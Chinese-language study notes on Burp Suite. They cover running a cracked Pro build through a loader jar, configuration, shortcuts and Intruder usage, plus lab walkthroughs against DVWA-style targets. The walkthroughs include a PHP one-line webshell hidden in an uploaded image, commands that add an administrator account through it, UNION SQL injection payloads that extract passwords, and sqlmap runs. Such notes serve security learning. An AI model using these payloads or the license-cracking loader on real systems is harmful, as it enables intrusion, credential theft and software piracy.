## 精简

https://www.52pojie.cn/forum.php?mod=viewthread&tid=1687434
```sh
zip -q -d burpsuite_pro_v2022.9.jar chromium-macosarm64-105.0.5195.102.zip
zip -q -d burpsuite_pro_v2022.9.jar chromium-macosx64-105.0.5195.102.zip
zip -q -d burpsuite_pro_v2022.9.jar chromium-linux64-105.0.5195.102.zip

7z d -r burpsuite_pro_v2021.6.2.jar chromium-linux*
7z d -r burpsuite_pro_v2021.6.2.jar chromium-macos*

(Get-ChildItem burp*.jar)[0].Name | %{7z d -r $_ chromium-linux* chromium-macos*}
```

## 配置

 __中文__ 

* User Option - Display - Http Message Display, 使用宋体
* Character Sets: UTF8

 __启动命令__ 
```
普通启动
javaw -jar burploader.jar
跳过loader
javaw -noverify -javaagent:burploader.jar -jar burpsuite_pro_v2021.6.2.jar
禁止缩放 防止光标错位
javaw -noverify -Dsun.java2d.uiScale=1 -javaagent:burploader.jar -jar burpsuite_pro_v2021.6.2.jar
```


## Reading
https://t0data.gitbooks.io/burpsuite/content/chapter3.html

Intuder 注意, payloads最下面转义(url encode)有时候需要关掉


排除地址, 拦截的时候 Proxy - Intercept - Action - Don't intercept request =>

    Target选项卡-scope include .* .* .*
    Target选项卡-scope exclude .*firefox.*

Proxy-Option-Intercept Client Requests, 添加does not match [url]

    ^.*(bdstatic|baidu|g-fox|firefox|mozilla|google|alicdn).*$
    可能Scope中使用advanced scope也要排除

exclude url from histroy

    1. Proxy - Options - Miscellaneous - Don't send items to Proxy history or live tasks, if out of scope
    2. Project Options选项卡 - Out of Scope requests -  Drop all , 开启后其他地址返回404

拦截指定网址

    方法1 “Proxy”选项卡--选择“Options”菜单--往下看到“Intercept Client Requests”节区
    方法2 你可以使用“include in-scope items only(仅仅包括在范围内的项目)”以减少数据必须保存量。


[Intuder](https://blog.51cto.com/laoyinga/2151018)
    
    几种模式对应不同的payload数量
    
    结果过滤
        flag\{.*\}
        ctfhub\{.*\}

添加自定义header

  Proxy - Options - Match and Replace
  match为空就是添加
       添加到 response header, match空
       replace: Content-type:text/html;charset=utf-8

## 快捷键
```
Ctrl T, Toggle Intercept
Ctrl Shift P, Switch to Proxy
Ctrl Shift I, Switch to Intruder
Ctrl Shift R, Switch to Repeater
Ctrl +/-, 切换标签
```
## Burp Suite常见问题
GET改POST请求

    自动修改： 推荐---, 右击 Change request method
    手动修改： 添加  `Content-Type: application/x-www-form-urlencoded`

refresh 自动刷新的变量字段。
Options - Grep Match 常用，密码错误的时候，可以添加一个匹配关键字。开始攻击后会多一个字段。[^1]

      结果中也可以过滤(在标签Result下面)，
      grep - match 添加过滤字段 login_error,比返回长度效果更好。
      runtime file 每行作为一个
      custom iterator , 可以生成像 username@@password  ，选posisiton 2 @@, position3 password,
      copy other payload , 两次payload值要一样时使用。

wordpress , ?author=1 可以知道 id=1的用户

## Burp Suite 破解文件上传
普通难度： 

    抓包, 1. 改 content-type即可。 image/png
    抓包, 2. 改 file-name 即可。 image/png

High级别---系统认可图片

    copy test.png/b+test.html/a a.png
    test.html:  `<script>alert(1)</script>`

用来上传php, 比如 `copy test.png/b+hack.php/a caidao.png`

hack.php 里写一句话木马  :<?php @eval(_POST['1']);?>

查看有没效果

http://192.168.1.107/dwva/vulnerabilities/fi/?page=/hackable/uploafs/caidao.png   

hackbar

URI： http://192.168.1.107/dwva/vulnerabilities/fi/?page=C:\www\DWVA\hackable/uploads/hack.png

    POST:1=echo '<pre>';system('ipconfig')
    POST:1=echo '<pre>';system('net user hack 123456/add');
    POST:1=echo '<pre>';system('net localgroup administrators hack /add'):

## Burp Suite配合SQLmap实现被动式注入发现

    User Option - Misc - Logging, √Proxy Request ,选择一个文件位置保存。
    打开文件搜索请求，确定请求存在。
    sqlmap.py -r 文件目录
    sqlmap.py -r C:\log\1.txt --batch
    找到并查看 outout文件。在txt中找到注入链接, 比如，测试
    sqlmap.py -u "http://192.168.1.102/inject.php?id=2" --dbs

## Burp Suite数据获取测试
用BP抓个包 比如 http://192.168.1.102/inject.php?id=1

`在1后面加a 1$a$ a设置成字段。`

Payloads- Payloads Options , Load , 找 FuzzLists目录下的 sqli-union-select

用Intruder 开始攻击, 查看结果-Response

查看结果后 确定为3个字段，在结果里右击查询3字段的发送到repeater, Go一下。

     在params里 select%201,2,3 from a   测试a表是否存在。显示 doesn't exist, 将它 设置成Grep Match 字段进行过滤。
     payloads load,  common-tables进行start attack。

查看结果， 确定admin为表名。继续修改params 猜列名

        select%201,a,3%20from%20admin 显示 unkonwn column ，将请求必到Intruder,
          将 a 设置成变量， unkonwn column为过滤字段。
          payload - load, comman - column
          start attack,查看结果。
          确定了id , password, 列。
        -1 union all select%201,password,3%20from%20admin
        -1 union all select%201,password,3%20from%20admin limit 0, 1
发到 Intruder

    id=1 union all select 1,2,3 from admin#
    id=1 union all select 1,password,3 from admin#
    id=1 union all select 1,concat(id, username, password),3 from admin#
    id=1 union all select 1,concat(id,0x7c, username,0x7c, password),3 from admin#
     0x7c是管理符 | 

发到intruder, 

      limit%20$0$,1 这里将0改为字段了。limit参数为：偏移量，最大数目
    
      payload type: numbers,
        from 0, to 3, step 1,
      start attack

Grep Extract, add选中后会自动正则。 清除多余的过滤。b

菜单栏 save - result table, 只留一个正则。保存

## Burp Suite目录与文件扫描测试
1.抓包 history中， 发到Intruder

2.Positions

```
payload 加载  php去重复.txt 字典
payload 选项卡 中有 Payload Encoding √要去掉 （否则会编码/符号）
start attack
在结果列表， Filter 只勾2xx
```

# Article
[实现 BurpSuite 多级代理的两种常用方法](https://mp.weixin.qq.com/s/x4_ZlE8H01ULjXrknIpKxg)
[Burpsuite双层代理的抓包小技巧](https://mp.weixin.qq.com/s/udmke_48dgg82awRnMNIXg)